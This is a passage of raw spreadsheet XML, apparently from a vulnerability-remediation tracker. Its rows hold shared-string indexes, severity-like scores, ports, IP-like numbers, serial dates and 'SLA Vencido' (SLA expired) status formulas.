        <v>44071</v>
      </c>
      <c r="AB21" s="9" t="s">
        <v>189</v>
      </c>
      <c r="AC21" s="4" t="s">
        <v>190</v>
      </c>
      <c r="AD21" s="32" t="s">
        <v>191</v>
      </c>
      <c r="AE21" s="8">
        <v>44078</v>
      </c>
      <c r="AF21" s="4" t="s">
        <v>148</v>
      </c>
      <c r="AG21" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="22" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A22" s="5">
        <v>21</v>
      </c>
      <c r="B22" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C22" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D22" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E22" s="4"/>
      <c r="F22" s="4"/>
      <c r="G22" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H22" s="4" t="s">
        <v>192</v>
      </c>
      <c r="I22" s="4" t="s">
        <v>193</v>
      </c>
      <c r="J22" s="4" t="s">
        <v>194</v>
      </c>
      <c r="K22" s="4"/>
      <c r="L22" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M22" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N22" s="7">
        <v>5</v>
      </c>
      <c r="O22" s="6"/>
      <c r="P22" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q22" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R22" s="4"/>
      <c r="S22" s="22"/>
      <c r="T22" s="8">
        <v>43784</v>
      </c>
      <c r="U22" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2425</v>
      </c>
      <c r="V22" s="8">
        <f t="shared" si="1"/>
        <v>43874</v>
      </c>
      <c r="W22" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X22" s="12"/>
      <c r="Y22" s="12"/>
      <c r="Z22" s="12"/>
      <c r="AA22" s="8">
        <v>44014</v>
      </c>
      <c r="AB22" s="9" t="s">
        <v>195</v>
      </c>
      <c r="AC22" s="9" t="s">
        <v>196</v>
      </c>
      <c r="AD22" s="32" t="s">
        <v>197</v>
      </c>
      <c r="AE22" s="27">
        <v>44036</v>
      </c>
      <c r="AF22" s="4" t="s">
        <v>148</v>
      </c>
      <c r="AG22" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="23" spans="1:33" ht="51" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A23" s="5">
        <v>22</v>
      </c>
      <c r="B23" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C23" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D23" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E23" s="4" t="s">
        <v>198</v>
      </c>
      <c r="F23" s="4"/>
      <c r="G23" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H23" s="4" t="s">
        <v>199</v>
      </c>
      <c r="I23" s="4" t="s">
        <v>200</v>
      </c>
      <c r="J23" s="4" t="s">
        <v>153</v>
      </c>
      <c r="K23" s="4"/>
      <c r="L23" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M23" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N23" s="7">
        <v>4.3000001907348633</v>
      </c>
      <c r="O23" s="6"/>
      <c r="P23" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q23" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R23" s="4">
        <v>443</v>
      </c>
      <c r="S23" s="22"/>
      <c r="T23" s="8">
        <v>43719</v>
      </c>
      <c r="U23" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2490</v>
      </c>
      <c r="V23" s="8">
        <f t="shared" si="1"/>
        <v>43809</v>
      </c>
      <c r="W23" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X23" s="12"/>
      <c r="Y23" s="12"/>
      <c r="Z23" s="12"/>
      <c r="AA23" s="8">
        <v>43917</v>
      </c>
      <c r="AB23" s="4"/>
      <c r="AC23" s="9" t="s">
        <v>154</v>
      </c>
      <c r="AD23" s="32" t="s">
        <v>155</v>
      </c>
      <c r="AE23" s="9"/>
      <c r="AF23" s="4" t="s">
        <v>201</v>
      </c>
      <c r="AG23" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="24" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A24" s="5">
        <v>23</v>
      </c>
      <c r="B24" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C24" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D24" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E24" s="4" t="s">
        <v>202</v>
      </c>
      <c r="F24" s="4"/>
      <c r="G24" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H24" s="4" t="s">
        <v>203</v>
      </c>
      <c r="I24" s="4" t="s">
        <v>204</v>
      </c>
      <c r="J24" s="4" t="s">
        <v>205</v>
      </c>
      <c r="K24" s="4"/>
      <c r="L24" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M24" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N24" s="7">
        <v>3.5</v>
      </c>
      <c r="O24" s="6"/>
      <c r="P24" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q24" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R24" s="4"/>
      <c r="S24" s="22"/>
      <c r="T24" s="8">
        <v>43784</v>
      </c>
      <c r="U24" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2425</v>
      </c>
      <c r="V24" s="8">
        <f t="shared" si="1"/>
        <v>43904</v>
      </c>
      <c r="W24" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X24" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y24" s="12" t="s">
        <v>206</v>
      </c>
      <c r="Z24" s="12" t="s">
        <v>207</v>
      </c>
      <c r="AA24" s="8">
        <v>44117</v>
      </c>
      <c r="AB24" s="9" t="s">
        <v>208</v>
      </c>
      <c r="AC24" s="14" t="s">
        <v>209</v>
      </c>
      <c r="AD24" s="35" t="s">
        <v>210</v>
      </c>
      <c r="AE24" s="28">
        <v>44148</v>
      </c>
      <c r="AF24" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG24" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="25" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A25" s="5">
        <v>24</v>
      </c>
      <c r="B25" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C25" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D25" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E25" s="4" t="s">
        <v>211</v>
      </c>
      <c r="F25" s="4"/>
      <c r="G25" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H25" s="4" t="s">
        <v>212</v>
      </c>
      <c r="I25" s="4" t="s">
        <v>213</v>
      </c>
      <c r="J25" s="4" t="s">
        <v>214</v>
      </c>
      <c r="K25" s="4"/>
      <c r="L25" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M25" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N25" s="7">
        <v>3.2000000476837158</v>
      </c>
      <c r="O25" s="6"/>
      <c r="P25" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q25" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R25" s="4"/>
      <c r="S25" s="22"/>
      <c r="T25" s="8">
        <v>43609</v>
      </c>
      <c r="U25" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2600</v>
      </c>
      <c r="V25" s="8">
        <f t="shared" si="1"/>
        <v>43729</v>
      </c>
      <c r="W25" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X25" s="12"/>
      <c r="Y25" s="12"/>
      <c r="Z25" s="12"/>
      <c r="AA25" s="8">
        <v>43908</v>
      </c>
      <c r="AB25" s="9" t="s">
        <v>215</v>
      </c>
      <c r="AC25" s="9" t="s">
        <v>216</v>
      </c>
      <c r="AD25" s="32" t="s">
        <v>217</v>
      </c>
      <c r="AE25" s="9"/>
      <c r="AF25" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG25" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="26" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A26" s="5">
        <v>25</v>
      </c>
      <c r="B26" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C26" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D26" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E26" s="4" t="s">
        <v>218</v>
      </c>
      <c r="F26" s="4"/>
      <c r="G26" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H26" s="4" t="s">
        <v>219</v>
      </c>
      <c r="I26" s="4" t="s">
        <v>220</v>
      </c>
      <c r="J26" s="4" t="s">
        <v>221</v>
      </c>
      <c r="K26" s="4"/>
      <c r="L26" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M26" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N26" s="7">
        <v>3.0999999046325684</v>
      </c>
      <c r="O26" s="6"/>
      <c r="P26" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q26" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R26" s="4">
        <v>443</v>
      </c>
      <c r="S26" s="22"/>
      <c r="T26" s="8">
        <v>43719</v>
      </c>
      <c r="U26" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2490</v>
      </c>
      <c r="V26" s="8">
        <f t="shared" si="1"/>
        <v>43839</v>
      </c>
      <c r="W26" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X26" s="12"/>
      <c r="Y26" s="12"/>
      <c r="Z26" s="12"/>
      <c r="AA26" s="13">
        <v>43921</v>
      </c>
      <c r="AB26" s="9" t="s">
        <v>222</v>
      </c>
      <c r="AC26" s="9" t="s">
        <v>223</v>
      </c>
      <c r="AD26" s="32" t="s">
        <v>224</v>
      </c>
      <c r="AE26" s="9"/>
      <c r="AF26" s="4" t="s">
        <v>148</v>
      </c>
      <c r="AG26" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="27" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A27" s="5">
        <v>26</v>
      </c>
      <c r="B27" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C27" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D27" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E27" s="4" t="s">
        <v>226</v>
      </c>
      <c r="F27" s="4"/>
      <c r="G27" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H27" s="4" t="s">
        <v>227</v>
      </c>
      <c r="I27" s="4"/>
      <c r="J27" s="4" t="s">
        <v>228</v>
      </c>
      <c r="K27" s="4"/>
      <c r="L27" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M27" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N27" s="5" t="s">
        <v>229</v>
      </c>
      <c r="O27" s="6"/>
      <c r="P27" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q27" s="6" t="s">
        <v>44</v>
      </c>
      <c r="R27" s="4">
        <v>443</v>
      </c>
      <c r="S27" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T27" s="8">
        <v>43816</v>
      </c>
      <c r="U27" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2393</v>
      </c>
      <c r="V27" s="8">
        <f t="shared" si="1"/>
        <v>43906</v>
      </c>
      <c r="W27" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X27" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y27" s="30" t="s">
        <v>177</v>
      </c>
      <c r="Z27" s="30" t="s">
        <v>177</v>
      </c>
      <c r="AA27" s="8">
        <v>44025</v>
      </c>
      <c r="AB27" s="4"/>
      <c r="AC27" s="9" t="s">
        <v>231</v>
      </c>
      <c r="AD27" s="32" t="s">
        <v>232</v>
      </c>
      <c r="AE27" s="27">
        <v>44012</v>
      </c>
      <c r="AF27" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG27" s="27"/>
    </row>
    <row r="28" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A28" s="5">
        <v>27</v>
      </c>
      <c r="B28" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C28" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D28" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E28" s="4"/>
      <c r="F28" s="4"/>
      <c r="G28" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H28" s="4" t="s">
        <v>233</v>
      </c>
      <c r="I28" s="4"/>
      <c r="J28" s="4" t="s">
        <v>234</v>
      </c>
      <c r="K28" s="4"/>
      <c r="L28" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M28" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N28" s="5" t="s">
        <v>229</v>
      </c>
      <c r="O28" s="6"/>
      <c r="P28" s="10">
        <v>94188208248</v>
      </c>
      <c r="Q28" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R28" s="4">
        <v>443</v>
      </c>
      <c r="S28" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T28" s="8">
        <v>43816</v>
      </c>
      <c r="U28" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2393</v>
      </c>
      <c r="V28" s="8">
        <f t="shared" si="1"/>
        <v>43906</v>
      </c>
      <c r="W28" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X28" s="11"/>
      <c r="Y28" s="11"/>
      <c r="Z28" s="11"/>
      <c r="AA28" s="4"/>
      <c r="AB28" s="9" t="s">
        <v>235</v>
      </c>
      <c r="AC28" s="9" t="s">
        <v>236</v>
      </c>
      <c r="AD28" s="32" t="s">
        <v>237</v>
      </c>
      <c r="AE28" s="9"/>
      <c r="AF28" s="9" t="s">
        <v>201</v>
      </c>
      <c r="AG28" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="29" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A29" s="5">
        <v>28</v>
      </c>
      <c r="B29" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C29" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D29" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E29" s="4"/>
      <c r="F29" s="4"/>
      <c r="G29" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H29" s="4" t="s">
        <v>238</v>
      </c>
      <c r="I29" s="4"/>
      <c r="J29" s="4" t="s">
        <v>239</v>
      </c>
      <c r="K29" s="4"/>
      <c r="L29" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M29" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N29" s="5" t="s">
        <v>229</v>
      </c>
      <c r="O29" s="6"/>
      <c r="P29" s="10">
        <v>94188208248</v>
      </c>
      <c r="Q29" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R29" s="4">
        <v>443</v>
      </c>
      <c r="S29" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T29" s="8">
        <v>43816</v>
      </c>
      <c r="U29" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2393</v>
      </c>
      <c r="V29" s="8">
        <f t="shared" si="1"/>
        <v>43906</v>
      </c>
      <c r="W29" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X29" s="11"/>
      <c r="Y29" s="11"/>
      <c r="Z29" s="11"/>
      <c r="AA29" s="8">
        <v>43934</v>
      </c>
      <c r="AB29" s="4"/>
      <c r="AC29" s="9" t="s">
        <v>240</v>
      </c>
      <c r="AD29" s="32" t="s">
        <v>241</v>
      </c>
      <c r="AE29" s="9"/>
      <c r="AF29" s="4" t="s">
        <v>148</v>
      </c>
      <c r="AG29" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="30" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A30" s="5">
        <v>29</v>
      </c>
      <c r="B30" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C30" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D30" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E30" s="4"/>
      <c r="F30" s="4"/>
      <c r="G30" s="6" t="s">
        <v>244</v>
      </c>
      <c r="H30" s="4"/>
      <c r="I30" s="4"/>
      <c r="J30" s="4" t="s">
        <v>245</v>
      </c>
      <c r="K30" s="4" t="s">
        <v>246</v>
      </c>
      <c r="L30" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M30" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N30" s="5"/>
      <c r="O30" s="6"/>
      <c r="P30" s="4" t="s">
        <v>247</v>
      </c>
      <c r="Q30" s="6"/>
      <c r="R30" s="4">
        <v>443</v>
      </c>
      <c r="S30" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T30" s="8">
        <v>43812</v>
      </c>
      <c r="U30" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V30" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W30" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X30" s="11"/>
      <c r="Y30" s="11"/>
      <c r="Z30" s="11"/>
      <c r="AA30" s="8">
        <v>43969</v>
      </c>
      <c r="AB30" s="9" t="s">
        <v>248</v>
      </c>
      <c r="AC30" s="9" t="s">
        <v>249</v>
      </c>
      <c r="AD30" s="36"/>
      <c r="AE30" s="4"/>
      <c r="AF30" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG30" s="27"/>
    </row>
    <row r="31" spans="1:33" ht="116" x14ac:dyDescent="0.35">
      <c r="A31" s="5">
        <v>30</v>
      </c>
      <c r="B31" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C31" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D31" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E31" s="4"/>
      <c r="F31" s="4"/>
      <c r="G31" s="6" t="s">
        <v>244</v>
      </c>
      <c r="H31" s="4"/>
      <c r="I31" s="4"/>
      <c r="J31" s="4" t="s">
        <v>245</v>
      </c>
      <c r="K31" s="4" t="s">
        <v>246</v>
      </c>
      <c r="L31" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M31" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N31" s="5"/>
      <c r="O31" s="6"/>
      <c r="P31" s="4" t="s">
        <v>250</v>
      </c>
      <c r="Q31" s="6"/>
      <c r="R31" s="4">
        <v>443</v>
      </c>
      <c r="S31" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T31" s="8">
        <v>43812</v>
      </c>
      <c r="U31" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V31" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W31" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X31" s="11"/>
      <c r="Y31" s="11"/>
      <c r="Z31" s="11"/>
      <c r="AA31" s="8">
        <v>43969</v>
      </c>
      <c r="AB31" s="9" t="s">
        <v>251</v>
      </c>
      <c r="AC31" s="9" t="s">
        <v>249</v>
      </c>
      <c r="AD31" s="36"/>
      <c r="AE31" s="4"/>
      <c r="AF31" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG31" s="27"/>
    </row>
    <row r="32" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A32" s="5">
        <v>31</v>
      </c>
      <c r="B32" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C32" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D32" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E32" s="4"/>
      <c r="F32" s="4"/>
      <c r="G32" s="6" t="s">
        <v>252</v>
      </c>
      <c r="H32" s="4"/>
      <c r="I32" s="4"/>
      <c r="J32" s="4" t="s">
        <v>245</v>
      </c>
      <c r="K32" s="4" t="s">
        <v>246</v>
      </c>
      <c r="L32" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M32" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N32" s="5"/>
      <c r="O32" s="6"/>
      <c r="P32" s="4" t="s">
        <v>253</v>
      </c>
      <c r="Q32" s="6"/>
      <c r="R32" s="4">
        <v>443</v>
      </c>
      <c r="S32" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T32" s="8">
        <v>43812</v>
      </c>
      <c r="U32" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V32" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W32" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X32" s="11"/>
      <c r="Y32" s="11"/>
      <c r="Z32" s="11"/>
      <c r="AA32" s="8">
        <v>43969</v>
      </c>
      <c r="AB32" s="9" t="s">
        <v>254</v>
      </c>
      <c r="AC32" s="9" t="s">
        <v>249</v>
      </c>
      <c r="AD32" s="36"/>
      <c r="AE32" s="4"/>
      <c r="AF32" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG32" s="27"/>
    </row>
    <row r="33" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A33" s="5">
        <v>32</v>
      </c>
      <c r="B33" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C33" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D33" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E33" s="4"/>
      <c r="F33" s="4"/>
      <c r="G33" s="6" t="s">
        <v>255</v>
      </c>
      <c r="H33" s="4"/>
      <c r="I33" s="4"/>
      <c r="J33" s="4" t="s">
        <v>256</v>
      </c>
      <c r="K33" s="9" t="s">
        <v>257</v>
      </c>
      <c r="L33" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M33" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N33" s="5"/>
      <c r="O33" s="6"/>
      <c r="P33" s="10">
        <v>190216136242</v>
      </c>
      <c r="Q33" s="6"/>
      <c r="R33" s="4">
        <v>123</v>
      </c>
      <c r="S33" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T33" s="8">
        <v>43812</v>
      </c>
      <c r="U33" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V33" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W33" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X33" s="11"/>
      <c r="Y33" s="11"/>
      <c r="Z33" s="11"/>
      <c r="AA33" s="8"/>
      <c r="AB33" s="9" t="s">
        <v>259</v>
      </c>
      <c r="AC33" s="9" t="s">
        <v>260</v>
      </c>
      <c r="AD33" s="36"/>
      <c r="AE33" s="4"/>
      <c r="AF33" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG33" s="27"/>
    </row>
    <row r="34" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A34" s="5">
        <v>33</v>
      </c>
      <c r="B34" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C34" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D34" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E34" s="4"/>
      <c r="F34" s="4"/>
      <c r="G34" s="6" t="s">
        <v>255</v>
      </c>
      <c r="H34" s="4"/>
      <c r="I34" s="4"/>
      <c r="J34" s="4" t="s">
        <v>256</v>
      </c>
      <c r="K34" s="9" t="s">
        <v>257</v>
      </c>
      <c r="L34" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M34" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N34" s="5"/>
      <c r="O34" s="6"/>
      <c r="P34" s="10">
        <v>190216136241</v>
      </c>
      <c r="Q34" s="6"/>
      <c r="R34" s="4">
        <v>123</v>
      </c>
      <c r="S34" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T34" s="8">
        <v>43812</v>
      </c>
      <c r="U34" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V34" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W34" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X34" s="11"/>
      <c r="Y34" s="11"/>
      <c r="Z34" s="11"/>
      <c r="AA34" s="8"/>
      <c r="AB34" s="9" t="s">
        <v>262</v>
      </c>
      <c r="AC34" s="9" t="s">
        <v>260</v>
      </c>
      <c r="AD34" s="36"/>
      <c r="AE34" s="4"/>
      <c r="AF34" s="9" t="s">
        <v>261</v>
      </c>
      <c r="AG34" s="27"/>
    </row>
    <row r="35" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A35" s="5">
        <v>34</v>
      </c>
      <c r="B35" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C35" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D35" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E35" s="4"/>
      <c r="F35" s="4"/>
      <c r="G35" s="6" t="s">
        <v>263</v>
      </c>
      <c r="H35" s="4"/>
      <c r="I35" s="4"/>
      <c r="J35" s="4" t="s">
        <v>256</v>
      </c>
      <c r="K35" s="9" t="s">
        <v>257</v>
      </c>
      <c r="L35" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M35" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N35" s="5"/>
      <c r="O35" s="6"/>
      <c r="P35" s="4" t="s">
        <v>264</v>
      </c>
      <c r="Q35" s="6"/>
      <c r="R35" s="4">
        <v>123</v>
      </c>
      <c r="S35" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T35" s="8">
        <v>43812</v>
      </c>
      <c r="U35" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V35" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W35" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X35" s="11"/>
      <c r="Y35" s="11"/>
      <c r="Z35" s="11"/>
      <c r="AA35" s="8">
        <v>44069</v>
      </c>
      <c r="AB35" s="9" t="s">
        <v>265</v>
      </c>
      <c r="AC35" s="9" t="s">
        <v>260</v>
      </c>
      <c r="AD35" s="36"/>
      <c r="AE35" s="4"/>
      <c r="AF35" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG35" s="27"/>
    </row>
    <row r="36" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A36" s="5">
        <v>35</v>
      </c>
      <c r="B36" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C36" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D36" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E36" s="4"/>
      <c r="F36" s="4"/>
      <c r="G36" s="6" t="s">
        <v>263</v>
      </c>
      <c r="H36" s="4"/>
      <c r="I36" s="4"/>
      <c r="J36" s="4" t="s">
        <v>266</v>
      </c>
      <c r="K36" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L36" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M36" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N36" s="5"/>
      <c r="O36" s="6"/>
      <c r="P36" s="6" t="s">
        <v>268</v>
      </c>
      <c r="Q36" s="6"/>
      <c r="R36" s="4">
        <v>161</v>
      </c>
      <c r="S36" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T36" s="8">
        <v>43812</v>
      </c>
      <c r="U36" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V36" s="8">
        <f t="shared" si="1"/>
        <v>43902</v>
      </c>
      <c r="W36" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X36" s="11"/>
      <c r="Y36" s="11"/>
      <c r="Z36" s="11"/>
      <c r="AA36" s="8">
        <v>43969</v>
      </c>
      <c r="AB36" s="9" t="s">
        <v>269</v>
      </c>
      <c r="AC36" s="9" t="s">
        <v>270</v>
      </c>
      <c r="AD36" s="36"/>
      <c r="AE36" s="4"/>
      <c r="AF36" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG36" s="27"/>
    </row>
    <row r="37" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A37" s="5">
        <v>36</v>
      </c>
      <c r="B37" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C37" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D37" s="5" t="s">
        <v>243</v>
      </c>
      <c r="E37" s="4"/>
      <c r="F37" s="4"/>
      <c r="G37" s="6" t="s">
        <v>263</v>
      </c>
      <c r="H37" s="4"/>
      <c r="I37" s="4"/>
      <c r="J37" s="4" t="s">
        <v>266</v>
      </c>
      <c r="K37" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L37" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M37" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N37" s="5"/>
      <c r="O37" s="6"/>
      <c r="P37" s="6" t="s">
        <v>264</v>
      </c>
      <c r="Q37" s="6"/>
      <c r="R37" s="4">
        <v>123</v>
      </c>
      <c r="S37" s="22" t="s">
        <v>258</v>
      </c>
      <c r="T37" s="8">
        <v>43812</v>
      </c>
      <c r="U37" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2397</v>
      </c>
      <c r="V37" s="8">
